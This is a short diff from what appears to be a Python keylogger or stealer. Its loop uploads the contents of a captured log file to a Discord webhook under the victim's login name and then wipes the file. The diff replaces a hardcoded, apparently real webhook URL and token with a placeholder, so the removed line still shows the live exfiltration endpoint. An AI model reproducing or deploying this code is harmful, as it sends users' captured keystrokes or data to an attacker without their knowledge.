@@ -30,7 +30,7 @@ def run():
         global tmp
         while True:
             if os.path.exists(tmp) and os.path.getsize(tmp) != 0:
-                webhook = discord_webhook.DiscordWebhook("https://discord.com/api/webhooks/995675984319754241/9hITbwFGNUoBVuZnDufigbhNPKXgEEOmSXQBaNBzDiA4atypqnAQwdiC1dDatJZoxS_j", username="Logs for " + os.getlogin())
+                webhook = discord_webhook.DiscordWebhook("WEBHOOK URI", username="Logs for " + os.getlogin())
                 with open(tmp, "rb") as c:
                     webhook.add_file(c.read(), "log.txt")
                 with open(tmp, "w") as f: f.write("") #reset logs
